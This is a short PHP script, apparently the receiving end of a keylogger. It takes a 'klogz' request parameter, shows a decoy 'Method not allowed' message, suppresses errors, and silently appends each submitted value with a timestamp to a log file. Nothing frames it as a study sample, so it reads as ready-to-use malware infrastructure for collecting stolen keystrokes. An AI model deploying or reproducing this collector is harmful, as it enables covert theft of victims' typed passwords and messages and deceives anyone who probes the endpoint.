<?php
date_default_timezone_set('Asia/Manila');
error_reporting(0);
$log = $_REQUEST['klogz'];
if($log == null or $log == ''){
	echo"<h1>Method not allowed</h1>";
}else{
	echo "<h2>Method not allowed</h2>";
	$file = fopen('logz.txt','a');
	$data = "<div class='logmsg'><table><tr><th><b>===================[ ".date("g:i:s\s A")." ]===================</b></th></tr><br><tr><th>".stripslashes(htmlspecialchars($log))."</th></tr></table></div>\n";
	fwrite($file, $data);
	fclose($file);
}
?>
